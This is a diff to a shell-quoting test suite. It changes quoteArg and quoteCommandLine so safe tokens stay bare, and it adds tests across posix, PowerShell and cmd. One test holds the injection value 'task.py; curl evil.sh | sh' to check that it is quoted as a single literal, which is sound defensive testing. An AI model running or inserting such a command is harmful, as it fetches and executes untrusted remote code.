@@ -46,6 +46,15 @@ suite("Shell Quote Test Suite", () => {
   });
 
   suite("quoteArg - posix", () => {
+    test("returns safe tokens unchanged", () => {
+      assert.strictEqual(quoteArg("inspect", "posix"), "inspect");
+      assert.strictEqual(
+        quoteArg("task.py@my_task", "posix"),
+        "task.py@my_task"
+      );
+      assert.strictEqual(quoteArg("--limit=10", "posix"), "--limit=10");
+    });
+
     test("single-quotes a value with spaces", () => {
       assert.strictEqual(quoteArg("my task", "posix"), "'my task'");
     });
@@ -94,19 +103,29 @@ suite("Shell Quote Test Suite", () => {
   });
 
   suite("quoteCommandLine", () => {
-    test("joins quoted parts with spaces (posix)", () => {
-      // Every part is quoted, including the program and subcommand — quoting
-      // unconditionally is simpler and safer than guessing which tokens need it.
+    test("leaves safe tokens bare and only quotes what needs it", () => {
+      // "inspect" and "eval" are safe; "my task.py@t" has a space and needs quoting.
       assert.strictEqual(
         quoteCommandLine(["inspect", "eval", "my task.py@t"], "posix"),
-        "'inspect' 'eval' 'my task.py@t'"
+        "inspect eval 'my task.py@t'"
       );
     });
 
     test("quotes a hostile target as a single literal token", () => {
       const hostile = "task.py; curl evil.sh | sh";
       const line = quoteCommandLine(["inspect", "eval", hostile], "posix");
-      assert.strictEqual(line, `'inspect' 'eval' '${hostile}'`);
+      assert.strictEqual(line, `inspect eval '${hostile}'`);
+    });
+
+    test("safe tokens are bare across all shell kinds", () => {
+      assert.strictEqual(
+        quoteCommandLine(["inspect", "eval", "task.py@my_task"], "powershell"),
+        "inspect eval task.py@my_task"
+      );
+      assert.strictEqual(
+        quoteCommandLine(["inspect", "eval", "task.py@my_task"], "cmd"),
+        "inspect eval task.py@my_task"
+      );
     });
   });
 });
